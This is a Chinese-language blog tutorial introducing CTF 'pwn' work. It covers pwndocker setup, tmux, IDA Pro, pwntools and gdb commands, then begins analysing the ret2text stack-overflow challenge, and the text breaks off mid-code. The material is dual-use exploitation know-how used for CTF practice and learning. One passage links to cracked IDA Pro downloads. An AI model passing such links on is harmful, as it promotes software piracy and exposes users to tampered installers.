<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>PWN导论1 Docker环境和常见工具</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">PWN导论1 Docker环境和常见工具</h1>
</header>
<section data-field="subtitle" class="p-summary">
系列：PWN导论
</section>
<section data-field="body" class="e-content">
<section name="42c3" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="dee1" id="dee1" class="graf graf--h3 graf--leading graf--title">PWN导论1 Docker环境和常见工具</h3><figure name="1d45" id="1d45" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="1*Yh4M1RzwSec_Kngxa1DdKg.jpeg" data-width="800" data-height="510" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*Yh4M1RzwSec_Kngxa1DdKg.jpeg"></figure><p name="b8e1" id="b8e1" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">一、PWN</strong></p><p name="d669" id="d669" class="graf graf--p graf-after--p">PWN读法类似于pown，是从英文单词own演化而来的。在计算机安全领域，PWN指的是利用二进制的漏洞获得目标主机的shell或敏感信息等等，总体上来说就是获得程序的控制权。</p><p name="6ab8" id="6ab8" class="graf graf--p graf-after--p">一般来说，PWN题目会提供一个二进制文件以及目标主机的连接信息（ip和port）。本地一般通过nc指令来连接到远程主机（也称为靶机）。大部分的题目都是部署在Linux下的，但是也会有少量的Windows和MacOS的题目。</p><p name="fcf5" id="fcf5" class="graf graf--p graf-after--p">但是，也并不是所有的PWN题目都会提供二进制的文件，例如盲打类的题目，包括盲打栈溢出，盲打格式化字符串等等。</p><p name="499f" id="499f" class="graf graf--p graf-after--p">在CTF竞赛中，为了防止选手破坏赛题环境，一般使用xinetd来部署环境。具体方法还有通过docker运行ubuntu1604/1804等等。此外还可能会更改根目录的位置，删除不必要的文件，限制执行有限的命令（cd、ls、cat等等）。在本地调试题目时，如果需要模拟远程环境可以使用socat。</p><p name="42b1" id="42b1" class="graf graf--p graf-after--p">（1）PWN的相关工具</p><ul class="postList"><li name="a421" id="a421" class="graf graf--li graf-after--p">IDA Pro 静态分析工具</li><li name="b6c4" id="b6c4" class="graf graf--li graf-after--li">Ghidra 静态分析工具</li><li name="b5d2" id="b5d2" class="graf graf--li graf-after--li">gdb相关工具：pwndbg，pwngdb</li><li name="7f29" id="7f29" class="graf graf--li graf-after--li">Python库：pwntools</li></ul><p name="90f7" id="90f7" class="graf graf--p graf-after--li">（2）PWN环境的<a href="https://hub.docker.com/r/skysider/pwndocker" data-href="https://hub.docker.com/r/skysider/pwndocker" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">配置</a></p><ul class="postList"><li name="18b4" id="18b4" class="graf graf--li graf-after--p">安装Docker：<a href="https://www.docker.com/get-started" data-href="https://www.docker.com/get-started" class="markup--anchor markup--li-anchor" rel="noopener" target="_blank">https://www.docker.com/get-started</a></li><li name="f03e" id="f03e" class="graf graf--li graf-after--li">打开terminal，输入：</li></ul><pre name="24ee" id="24ee" class="graf graf--pre graf-after--li">$ docker pull skysider/pwndocker</pre><ul class="postList"><li name="7a93" id="7a93" class="graf graf--li graf-after--pre">等待pull成功之后，我们进入到Desktop</li></ul><pre name="8911" id="8911" class="graf graf--pre graf-after--li">$ cd Desktop/</pre><ul class="postList"><li name="74f3" id="74f3" class="graf graf--li graf-after--pre">输入ctf_name参数</li></ul><pre name="e385" id="e385" class="graf graf--pre graf-after--li">$ ctf_name=replace-this-with-your-name</pre><ul class="postList"><li name="25de" id="25de" class="graf graf--li graf-after--pre">打开Pwndocker环境：</li></ul><pre name="238b" id="238b" class="graf graf--pre graf-after--li"><code class="markup--code markup--pre-code">$ docker run -d \<br>    --rm \<br>    -h ${ctf_name} \<br>    --name ${ctf_name} \<br>    -v $(pwd)/${ctf_name}:/ctf/work \<br>    -p 23946:23946 \<br>    --cap-add=SYS_PTRACE \<br>    skysider/pwndocker</code></pre><p name="9543" id="9543" class="graf graf--p graf-after--pre">之后我们可以看到在桌面上已经建立了一个文件夹，名字为我们在上一步输入的ctf_name参数。这个文件夹就是配置在我们给定的Pwndocker环境下的。</p><figure name="787f" id="787f" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*gJpYOAshg0q0KN9eny3YAg.png" data-width="1556" data-height="392" src="https://cdn-images-1.medium.com/max/800/1*gJpYOAshg0q0KN9eny3YAg.png"></figure><ul class="postList"><li name="98bd" id="98bd" class="graf graf--li graf-after--figure">我们通过下面的指令进入到Docker环境中：</li></ul><pre name="37bf" id="37bf" class="graf graf--pre graf-after--li"><code class="markup--code markup--pre-code">docker exec -it ${ctf_name} /bin/bash</code></pre><p name="5072" id="5072" class="graf graf--p graf-after--pre">之后，我们的提示符会变成：</p><pre name="1abe" id="1abe" class="graf graf--pre graf-after--p">root@your-name:/ctf/work#</pre><p name="0328" id="0328" class="graf graf--p graf-after--pre">这指的是我们已经进入了Docker环境中。</p><ul class="postList"><li name="90a9" id="90a9" class="graf graf--li graf-after--p">我们可以在新的环境中实现基本的指令，例如：</li></ul><pre name="e30a" id="e30a" class="graf graf--pre graf-after--li">vi helloworld<br>mkdir newdir</pre><figure name="087d" id="087d" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*oQac2fUKCFdZKIHLb9bwhQ.png" data-width="1558" data-height="460" src="https://cdn-images-1.medium.com/max/800/1*oQac2fUKCFdZKIHLb9bwhQ.png"></figure><p name="7fc1" id="7fc1" class="graf graf--p graf-after--figure">我们也可以删除上面的两个文件，通过：</p><pre name="1fe3" id="1fe3" class="graf graf--pre graf-after--p">rm *<br>rmdir *</pre><p name="7354" id="7354" class="graf graf--p graf-after--pre">（3）Docker环境的版本检查</p><p name="02b8" id="02b8" class="graf graf--p graf-after--p">在Pwndocker中输入：</p><pre name="8e15" id="8e15" class="graf graf--pre graf-after--p">lsb_release -a</pre><p name="3134" id="3134" class="graf graf--p graf-after--pre">则可以显示版本。我的版本是Ubuntu2004：</p><pre name="f451" id="f451" class="graf graf--pre graf-after--p">Distributor ID: Ubuntu <br>Description: Ubuntu 20.04 LTS <br>Release: 20.04 <br>Codename: focal</pre><p name="f2c0" id="f2c0" class="graf graf--p graf-after--pre">另外可以输入下面的指令来查看系统：</p><pre name="358f" id="358f" class="graf graf--pre graf-after--p">uname -a</pre><p name="bf44" id="bf44" class="graf graf--p graf-after--pre">（4）Docker的使用</p><p name="c25f" id="c25f" class="graf graf--p graf-after--p">通常的使用方法如下：</p><ul class="postList"><li name="6fee" id="6fee" class="graf graf--li graf-after--p">在共享文件夹中编写exp脚本</li><li name="4962" id="4962" class="graf graf--li graf-after--li">使用Sublime中的snippet快速编写exp脚本</li><li name="5178" id="5178" class="graf graf--li graf-after--li">在Docker中运行exp脚本并调试</li></ul><p name="74e7" id="74e7" class="graf graf--p graf-after--li"><strong class="markup--strong markup--p-strong">二、终端复用工具tmux</strong></p><p name="ee42" id="ee42" class="graf graf--p graf-after--p">tmux工具在Pwndocker中是自带的，激活tmux工具只需要在docker环境下输入：</p><pre name="198d" id="198d" class="graf graf--pre graf-after--p">tmux</pre><p name="6867" id="6867" class="graf graf--p graf-after--pre">tmux指令和vim指令类似，在执行之前需要输入前缀赚到指令栏。tmux的前缀是ctrl+b。下面是一些常见的指令：</p><ul class="postList"><li name="fad2" id="fad2" class="graf graf--li graf-after--p">左右分屏：</li></ul><pre name="ffce" id="ffce" class="graf graf--pre graf-after--li">ctrl+b 后 %</pre><ul class="postList"><li name="98db" id="98db" class="graf graf--li graf-after--pre">上下分屏：</li></ul><pre name="e976" id="e976" class="graf graf--pre graf-after--li">ctrl+b 后 &quot;</pre><ul class="postList"><li name="e809" id="e809" class="graf graf--li graf-after--pre">鼠标点击切换：</li></ul><pre name="66b9" id="66b9" class="graf graf--pre graf-after--li">ctrl+b 后 :</pre><p name="85fe" id="85fe" class="graf graf--p graf-after--pre">输入命令：</p><pre name="3f40" id="3f40" class="graf graf--pre graf-after--p">set -g mouse on</pre><figure name="9685" id="9685" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*E5r7czcJp35k7NRMaQBV_g.png" data-width="1570" data-height="578" src="https://cdn-images-1.medium.com/max/800/1*E5r7czcJp35k7NRMaQBV_g.png"></figure><p name="bb4f" id="bb4f" class="graf graf--p graf-after--figure">之后就可以通过鼠标点击的方式切换窗口。</p><p name="3bc1" id="3bc1" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">三、PWN工具详解</strong></p><ol class="postList"><li name="854f" id="854f" class="graf graf--li graf-after--p">IDA工具</li></ol><p name="2fe3" id="2fe3" class="graf graf--p graf-after--li">我们先在<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" data-href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">此链接</a>上下载一个ret2text文件到Desktop上面，之后我们将此文件移动到共享文件夹中。我们通过file指令来查看这个文件的格式：</p><pre name="c2a3" id="c2a3" class="graf graf--pre graf-after--p">file ret2text</pre><p name="3cd9" id="3cd9" class="graf graf--p graf-after--pre">我们看出这个文件是32位的，所以我们需要使用32位的IDA进行反编译：</p><figure name="393d" id="393d" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*cH4Esa7e5pYOzWmtv5nYDw.png" data-width="1526" data-height="590" src="https://cdn-images-1.medium.com/max/800/1*cH4Esa7e5pYOzWmtv5nYDw.png"></figure><p name="c472" id="c472" class="graf graf--p graf-after--figure">（1）在MacOS下部署IDA Pro 7工具</p><p name="8603" id="8603" class="graf graf--p graf-after--p">在安装之前请检查MacOS的版本：如果MacOS版本为Mojave 10.15+，那么下面的方法可能就是不适用的，请自行解决。</p><p name="11a2" id="11a2" class="graf graf--p graf-after--p">下面是两个免费下载链接：<a href="http://www.xue51.com/mac/6045.html" data-href="http://www.xue51.com/mac/6045.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">点我下载1</a>，<a href="https://xclient.info/s/hex-rays-ida-pro.html" data-href="https://xclient.info/s/hex-rays-ida-pro.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">点我下载2</a>。（第一个链接只能用百度网盘下载；第二个链接可以用百度网盘或者城通网盘下载，第二个链接的解压密码是http://xclient.info/。安装时所需的密码在安装目录中的Crack文件夹中。）此外，此版本在下载之后在非英语的输入法下会自动Crash，解决方法是替换掉/Applications/IDA Pro 7.0/ida.app/Contents/PlugIns/platforms/（也可能不是这个路径，但是大概相同）路径下的名称为libqcocoa.dylib的文件，具体的做法可以参考<a href="https://github.com/fjh658/IDA7.0_SP" data-href="https://github.com/fjh658/IDA7.0_SP" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">github链接</a>。</p><p name="10d4" id="10d4" class="graf graf--p graf-after--p">（2）载入IDA分析</p><p name="fea8" id="fea8" class="graf graf--p graf-after--p">在得到文件的格式是32位的之后，我们就可以将其载入上一步安装好的IDA中进行分析。在上一步中，我们得到了两个版本的IDA，分别是IDA和IDA64。其中IDA负责分析32位的程序，而IDA64负责分析64位的程序。</p><p name="b599" id="b599" class="graf graf--p graf-after--p">（3）IDA页面</p><ul class="postList"><li name="3792" id="3792" class="graf graf--li graf-after--p">函数选择</li></ul><p name="b934" id="b934" class="graf graf--p graf-after--li">我们可以通过IDA页面左侧的函数栏进行函数的选择，例如在这里，我们可以先选择main函数。</p><figure name="26bc" id="26bc" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*fi_vRo3e5Ut71nnu5yZHCg.png" data-width="1374" data-height="806" src="https://cdn-images-1.medium.com/max/800/1*fi_vRo3e5Ut71nnu5yZHCg.png"></figure><ul class="postList"><li name="4c6b" id="4c6b" class="graf graf--li graf-after--figure">F5类c编程</li></ul><p name="0776" id="0776" class="graf graf--p graf-after--li">在IDA中我们使用最多的按键就是F5，在函数中通过F5按键，我们可以用C语言的格式打开代码并进行编辑。例如，在main页面中，我们按下F5打开C语言编程模式：</p><figure name="2a87" id="2a87" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*_VW5uCm2QhbojbHWuDS8Pw.png" data-width="1290" data-height="868" src="https://cdn-images-1.medium.com/max/800/1*_VW5uCm2QhbojbHWuDS8Pw.png"></figure><ul class="postList"><li name="5461" id="5461" class="graf graf--li graf-after--figure">双击进入函数</li></ul><p name="c3d9" id="c3d9" class="graf graf--p graf-after--li">在C编程模式下，我们可以双击函数名进入函数。例如，我们可以双击setvbuf函数：</p><figure name="41f2" id="41f2" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*KVOxZhkGH0_tBAQ6DM6Uew.png" data-width="1412" data-height="802" src="https://cdn-images-1.medium.com/max/800/1*KVOxZhkGH0_tBAQ6DM6Uew.png"></figure><ul class="postList"><li name="6ef6" id="6ef6" class="graf graf--li graf-after--figure">N快捷键修改变量/函数名</li></ul><p name="6c53" id="6c53" class="graf graf--p graf-after--li">如果我们想要修改某个变量的的名称，我们可以先在此变量/函数名称上单击，之后按下字母N键更改变量/函数名称。例如，如果我们想要将setvbuf函数中的n变量更改名称为N，那么：</p><figure name="2d19" id="2d19" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*XCPeBXdyL5e7nzKV-7r9_w.png" data-width="1326" data-height="866" src="https://cdn-images-1.medium.com/max/800/1*XCPeBXdyL5e7nzKV-7r9_w.png"></figure><ul class="postList"><li name="906c" id="906c" class="graf graf--li graf-after--figure">Tab返回窗口</li></ul><p name="d94e" id="d94e" class="graf graf--p graf-after--li">在C编程模式下，我们可以随时按下Tab键返回到汇编的页面。</p><ul class="postList"><li name="4a24" id="4a24" class="graf graf--li graf-after--p">Space键查看全局汇编窗口</li></ul><p name="fc30" id="fc30" class="graf graf--p graf-after--li">在汇编模式的某个函数中，我们可以通过按下Space键来进入到全文。</p><ul class="postList"><li name="9d45" id="9d45" class="graf graf--li graf-after--p">x键显示交叉引用</li></ul><p name="6013" id="6013" class="graf graf--p graf-after--li">在全局汇编窗口中在某变量上单击之后，按下x键就可以显示该变量在全局代码的使用情况。</p><ul class="postList"><li name="b1d1" id="b1d1" class="graf graf--li graf-after--p">列举字符串</li></ul><p name="4b6d" id="4b6d" class="graf graf--p graf-after--li">在工具栏中找到view &gt; open subviews &gt; strings，查看全局出现的所有字符串</p><p name="6af6" id="6af6" class="graf graf--p graf-after--p">2. pwntools包</p><p name="e65c" id="e65c" class="graf graf--p graf-after--p">pwntools是一个CTF框架和漏洞利用开发库，用Python开发，旨在让使用者简单快速的编写exploit脚本。</p><p name="a0c3" id="a0c3" class="graf graf--p graf-after--p">（1）pwntools的安装</p><p name="fb60" id="fb60" class="graf graf--p graf-after--p">我们可以在Python3环境下安装pwntools，但是我在安装依赖模块capstone时报错并且在github中没找到相应的issue（系统为：Mojave 10.14.6，Capstone-4.0.2）。我会很开心，如果有任何人安装成功了能麻烦请和我分享一下经验。</p><p name="b10f" id="b10f" class="graf graf--p graf-after--p">由于我没有办法在自己的Python环境下成功安装pwntools，所以我就借用之间使用的docker环境来使用pwntools。在docker中已经集成了pwntools所以我们不需要再安装。我们可以通过下面的语句检验pwntools是否在docker的环境下被安装，通过语句：</p><pre name="b244" id="b244" class="graf graf--pre graf-after--p">python3</pre><p name="e2ef" id="e2ef" class="graf graf--p graf-after--pre">我们进入python3的命令行。我的版本是python3.8.2。</p><pre name="c2ff" id="c2ff" class="graf graf--pre graf-after--p">from pwn import *<br>asm(&#39;xor eax,eax&#39;)</pre><p name="ea8a" id="ea8a" class="graf graf--p graf-after--pre">如果成功输出结果为：</p><pre name="004e" id="004e" class="graf graf--pre graf-after--p">b&#39;1\xc0&#39;</pre><p name="5800" id="5800" class="graf graf--p graf-after--pre">那么就说明已经成功安装了pwntools。由于我们的pwntools是在docker中使用的，所以我们可以在MacOS系统上编辑exp文件，之后拖拽到共享文件夹内执行即可。</p><p name="4a84" id="4a84" class="graf graf--p graf-after--p">（2）pwntools常用的函数（假设存在 from pwn import * ）</p><ul class="postList"><li name="07e2" id="07e2" class="graf graf--li graf-after--p">运行本地二进制文件</li></ul><pre name="fcf1" id="fcf1" class="graf graf--pre graf-after--li">sh=process(&#39;./...&#39;)</pre><ul class="postList"><li name="42a8" id="42a8" class="graf graf--li graf-after--pre">连接远程服务器</li></ul><pre name="269e" id="269e" class="graf graf--pre graf-after--li">sh=remote(ip, port)</pre><ul class="postList"><li name="c064" id="c064" class="graf graf--li graf-after--pre">关闭连接</li></ul><pre name="a699" id="a699" class="graf graf--pre graf-after--li">sh.close()</pre><ul class="postList"><li name="8ded" id="8ded" class="graf graf--li graf-after--pre">发送数据</li></ul><pre name="06a7" id="06a7" class="graf graf--pre graf-after--li">sh.send(data)                         # 发送数据<br>sh.sendline(data)                     # 发送数据并在最后加&#39;\n&#39;<br>sh.sendlineafter(&#39;string1&#39;,data)      # 在收到string1后发送数据<br>sh.sendlineafter(&#39;string1&#39;,data)      # 在收到string1后发送数据并在最后加&#39;\n&#39;</pre><ul class="postList"><li name="fc41" id="fc41" class="graf graf--li graf-after--pre">接收数据</li></ul><pre name="afd6" id="afd6" class="graf graf--pre graf-after--li">sh.recv(numb=2048, timeout=default)   # 接收数据，numb指定接收字节<br>sh.recvline(keepends=True)            # 接收一行数据，keepends指明是否保留&#39;\n&#39;<br>sh.recvuntil(&#39;\n&#39;,drop=True)          # 接收到指定字符，drop指不包括指定字符<br>sh.recvall()                          # 接收数据，直到收到EOF<br>sh.recvrepeat()                       # 接收数据，直到EOF或者timeout</pre><ul class="postList"><li name="f254" id="f254" class="graf graf--li graf-after--pre">交互</li></ul><pre name="6fdd" id="6fdd" class="graf graf--pre graf-after--li">sh.interactive()                      # 进行交互，相当于回到shell模式</pre><ul class="postList"><li name="e6c5" id="e6c5" class="graf graf--li graf-after--pre">地址处理</li></ul><pre name="0e76" id="0e76" class="graf graf--pre graf-after--li">u32(sh.recv(4))                      # 将4字节地址转换为32位<br>u64(sh.recv(6).ljust(8,&#39;\x00&#39;))      # 将6字节地址转换位64位<br>p32(0xffffffff)                      # 发送32字节地址<br>p64(0xffffffffffff)                  # 发送64字节地址</pre><p name="5265" id="5265" class="graf graf--p graf-after--pre">3. gdb动态调试工具</p><p name="43b6" id="43b6" class="graf graf--p graf-after--p">GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。</p><p name="7ba9" id="7ba9" class="graf graf--p graf-after--p">（1）gdb的开启</p><p name="7a22" id="7a22" class="graf graf--p graf-after--p">我们以ret2text程序为例子。首先，由于此程序是一个32位的文件，所以在打开文件之前我们先要更改文件的权限为所有人可访问。我们先进入docker环境，然后在共享文件夹中输入：</p><pre name="87c3" id="87c3" class="graf graf--pre graf-after--p">chmod 777 ./ret2text</pre><p name="87b3" id="87b3" class="graf graf--p graf-after--pre">之后我们通过下面的指令进入ret2text的调试模式下。</p><pre name="b9f2" id="b9f2" class="graf graf--pre graf-after--p">gdb ./ret2text</pre><p name="3996" id="3996" class="graf graf--p graf-after--pre">（2）gdb的指令</p><ul class="postList"><li name="f227" id="f227" class="graf graf--li graf-after--p">查看程序</li></ul><p name="4265" id="4265" class="graf graf--p graf-after--li">如果我们想要查看程序的基本信息，那么除了上面介绍的file方法，我们也可以在gdb内使用checksec。例如：</p><pre name="85aa" id="85aa" class="graf graf--pre graf-after--p">checksec</pre><ul class="postList"><li name="50de" id="50de" class="graf graf--li graf-after--pre">运行</li></ul><p name="de2b" id="de2b" class="graf graf--p graf-after--li">我们可以输入r或者run指令先来运行程序。例如：</p><pre name="6a36" id="6a36" class="graf graf--pre graf-after--p">r</pre><p name="620e" id="620e" class="graf graf--p graf-after--pre">我们看到输出为：</p><pre name="7a8c" id="7a8c" class="graf graf--pre graf-after--p">There is something amazing here, do you know anything?</pre><pre name="3a33" id="3a33" class="graf graf--pre graf-after--pre">Maybe I will tell you next time.</pre><p name="0077" id="0077" class="graf graf--p graf-after--pre">这表示我们成功运行了程序。</p><ul class="postList"><li name="d2d3" id="d2d3" class="graf graf--li graf-after--p">设置断点</li></ul><p name="1f4b" id="1f4b" class="graf graf--p graf-after--li">我们通过 b + 行数 或者 break + 行数 在第n行设置断点。我们也可以通过 b + 函数名 的形式设置断点。例如：</p><pre name="3378" id="3378" class="graf graf--pre graf-after--p">b main</pre><p name="67e1" id="67e1" class="graf graf--p graf-after--pre">表示我们在main函数处放置了一个断点。之后我们运行程序：</p><pre name="a607" id="a607" class="graf graf--pre graf-after--p">r</pre><p name="6cee" id="6cee" class="graf graf--p graf-after--pre">我们发现程序在main处中断了，输出了汇编指令。</p><ul class="postList"><li name="50c5" id="50c5" class="graf graf--li graf-after--p">继续运行</li></ul><p name="c324" id="c324" class="graf graf--p graf-after--li">如果我们想要在上面的基础之上继续运行文件，那么我们可以输入continue或者c。例如：</p><pre name="e832" id="e832" class="graf graf--pre graf-after--p">c</pre><p name="219c" id="219c" class="graf graf--p graf-after--pre">我们发现程序继续运行到结尾。</p><ul class="postList"><li name="8f9a" id="8f9a" class="graf graf--li graf-after--p">运行下一行</li></ul><p name="a661" id="a661" class="graf graf--p graf-after--li">如果我们想要按行运行程序并且在运行的时候<strong class="markup--strong markup--p-strong">不进入函数体的内部</strong>，那么我们就可以输入next或者n或者ni来执行下一行语句。例如：</p><pre name="ffc4" id="ffc4" class="graf graf--pre graf-after--p">n</pre><p name="1758" id="1758" class="graf graf--p graf-after--pre">如果我们想要进入每个函数体的内部运行下一行语句，那么我们就需要输入step或者s或者si：</p><pre name="c204" id="c204" class="graf graf--pre graf-after--p">s</pre><ul class="postList"><li name="f89d" id="f89d" class="graf graf--li graf-after--pre">输出变量或地址</li></ul><p name="4330" id="4330" class="graf graf--p graf-after--li">当我们在断点的时候想要查看某个变量的值或者某个地址的时候，我们可以通过print或者p来输出某个变量或者地址。例如：</p><pre name="269a" id="269a" class="graf graf--pre graf-after--p">p &amp;__malloc_hook</pre><ul class="postList"><li name="35cc" id="35cc" class="graf graf--li graf-after--pre">显示地址上的机器码</li></ul><p name="d11c" id="d11c" class="graf graf--p graf-after--li">通过x/指令我们可以指定某个地址及此地址附近机器码的显示。其中，数字表示的是显示此地址之后多少个单位。gx指的是对于64位的系统以8字节为一个单位显示；wx指的是对于32位的系统以4字节为一个单位显示。例如：</p><pre name="b391" id="b391" class="graf graf--pre graf-after--p">x/20gx addr            # 显示20个单位，每个单位8字节，对应64位系统<br>x/20wx addr            # 显示20个单位，每个单位4字节，对应32位系统</pre><ul class="postList"><li name="dbe8" id="dbe8" class="graf graf--li graf-after--pre">显示地址上的字符串</li></ul><p name="80b2" id="80b2" class="graf graf--p graf-after--li">我们依然是通过x/指令来显示某个地址上的内容。之后的s表示以字符串的形式输出此地址上的内容。例如：</p><pre name="ec82" id="ec82" class="graf graf--pre graf-after--p">x/s</pre><ul class="postList"><li name="5495" id="5495" class="graf graf--li graf-after--pre">查看寄存器上的值</li></ul><p name="ea94" id="ea94" class="graf graf--p graf-after--li">如果我们想要查看全部寄存器上的值，那么我们就需要指令：</p><pre name="9e97" id="9e97" class="graf graf--pre graf-after--p">info r</pre><p name="9129" id="9129" class="graf graf--p graf-after--pre">或者</p><pre name="1855" id="1855" class="graf graf--pre graf-after--p">info register</pre><ul class="postList"><li name="93a0" id="93a0" class="graf graf--li graf-after--pre">查看栈的内容</li></ul><p name="1f09" id="1f09" class="graf graf--p graf-after--li">我们可以通过stack + 数值的方式来查看栈中储存的内容。其中数值表示的是查看多少个栈地址。例如：</p><pre name="97dc" id="97dc" class="graf graf--pre graf-after--p">stack 20</pre><ul class="postList"><li name="c373" id="c373" class="graf graf--li graf-after--pre">内存映射</li></ul><p name="ab3c" id="ab3c" class="graf graf--p graf-after--li">在实际的调试中，有的时候我们需要在二进制程序运行的时候查看Linux的libc的库。如果要查看此库及其他依赖库的位置，则可以通过vmmap指令来实现。例如：</p><pre name="b83f" id="b83f" class="graf graf--pre graf-after--p">vmmap</pre><ul class="postList"><li name="3071" id="3071" class="graf graf--li graf-after--pre">查找数据</li></ul><p name="6b15" id="6b15" class="graf graf--p graf-after--li">如果我们想要查找数据，我们可以使用search指令。例如：</p><pre name="0e6f" id="0e6f" class="graf graf--pre graf-after--p">search &#39;a&#39;</pre><ul class="postList"><li name="af96" id="af96" class="graf graf--li graf-after--pre">数据分析</li></ul><p name="e518" id="e518" class="graf graf--p graf-after--li">如果我们想要分析某个数据，则需要tele指令即可。例如：</p><pre name="fcad" id="fcad" class="graf graf--pre graf-after--p">tele</pre><ul class="postList"><li name="de72" id="de72" class="graf graf--li graf-after--pre">查看plt表或者GOT表</li></ul><p name="9690" id="9690" class="graf graf--p graf-after--li">如果我们想要查看plt表，那么就需要：</p><pre name="ed48" id="ed48" class="graf graf--pre graf-after--p">plt</pre><p name="15ec" id="15ec" class="graf graf--p graf-after--pre">同样地，如果我们想要查看GOT表，那么：</p><pre name="806b" id="806b" class="graf graf--pre graf-after--p">got</pre><ul class="postList"><li name="b602" id="b602" class="graf graf--li graf-after--pre">数值修改</li></ul><p name="0d81" id="0d81" class="graf graf--p graf-after--li">如果我们需要修改某个地址或者寄存器上的值，可以直接使用set指令对其进行更改：</p><pre name="b02c" id="b02c" class="graf graf--pre graf-after--p">set *0x... = 0x...               # 更改某个地址上的数值<br>set rbp = 0x...                  # 更改rbp寄存器上的数值</pre><ul class="postList"><li name="2478" id="2478" class="graf graf--li graf-after--pre">带参运行</li></ul><p name="0123" id="0123" class="graf graf--p graf-after--li">如果在运行程序的同时是需要参数的，则可以在run后面加上参数即可。例如：</p><pre name="1d77" id="1d77" class="graf graf--pre graf-after--p">run aaaa</pre><ul class="postList"><li name="60d4" id="60d4" class="graf graf--li graf-after--pre">栈溢出时确定偏移</li></ul><p name="04bc" id="04bc" class="graf graf--p graf-after--li">通过cyclic + size指令，我们可以快速生成一个给定大小的字符串来测试栈溢出。并且这个字符串是非常有规律的。例如：</p><pre name="49da" id="49da" class="graf graf--pre graf-after--p">cyclic 200</pre><p name="9e34" id="9e34" class="graf graf--p graf-after--pre">我们可以通过输入该字符串的某一部分来查看这部分对应的偏移：</p><pre name="5594" id="5594" class="graf graf--pre graf-after--p">cyclic -l faaa</pre><ul class="postList"><li name="f830" id="f830" class="graf graf--li graf-after--pre">堆相关的指令</li></ul><p name="7112" id="7112" class="graf graf--p graf-after--li">包括arena，paseheap，heapinfo，unlink，orange，bins，magic，tcache等等，这一部分在目前不会有所涉及。</p><p name="f872" id="f872" class="graf graf--p graf-after--p">四、试一试ret2rext</p><p name="8e3f" id="8e3f" class="graf graf--p graf-after--p">我们先通过checksec指令查看程序。</p><pre name="7778" id="7778" class="graf graf--pre graf-after--p">checksec</pre><figure name="42f9" id="42f9" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*jDK8SHG8IW7Si82z4BgAog.png" data-width="994" data-height="218" src="https://cdn-images-1.medium.com/max/800/1*jDK8SHG8IW7Si82z4BgAog.png"></figure><p name="2b03" id="2b03" class="graf graf--p graf-after--figure">输出结果表明程序是i386的32位程序，NX保护已经开启，它指的是我们不能直接项栈或者堆上注入代码。因此我们需要通过其他方法绕过保护，常见的方法是ROP（Return Oriented Programming）。</p><p name="c8fe" id="c8fe" class="graf graf--p graf-after--p">下面我们通过IDA查看源码，打开IDA32并选择此ret2rext程序。在左侧选择main函数并且按下F5来查看源代码。可以看出源代码为：</p><pre name="e611" id="e611" class="graf graf--pre graf-after--p">int __cdecl main(int argc, const char **argv, const char **envp)<br>{<br>  char s; // [esp+1Ch] [ebp-64h]</pre><pre name="50fe" id="50fe" class="graf graf--pre graf-after--pre">setvbuf(stdout, 0, 2, 0);<br>  setvbuf(_bss_start, 0, 1, 0);<br>  puts(&quot;There is something amazing here, do you know anything?&quot;);<br>  gets(&amp;s);<br>  printf(&quot;Maybe I will tell you next time !&quot;);<br>  return 0;<br>}</pre><p name="4e0e" id="4e0e" class="graf graf--p graf-after--pre">由于程序在main函数中使用了gets函数，而gets函数是非常危险的函数，它不检查输入的字符串的长度，而是以回车来判断输入是否结束，这就会非常容易地产生栈溢出。</p><p name="8a0d" id="8a0d" class="graf graf--p graf-after--p">之后我们在选择secure函数，可以看到源代码为：</p><pre name="b95d" id="b95d" class="graf graf--pre graf-after--p">void secure()<br>{<br>  unsigned int v0; // eax<br>  int input; // [esp+18h] [ebp-10h]<br>  int secretcode; // [esp+1Ch] [ebp-Ch]</pre><pre name="47a1" id="47a1" class="graf graf--pre graf-after--pre">v0 = time(0);<br>  srand(v0);<br>  secretcode = rand();<br>  __isoc99_scanf((const char *)&amp;unk_8048760, 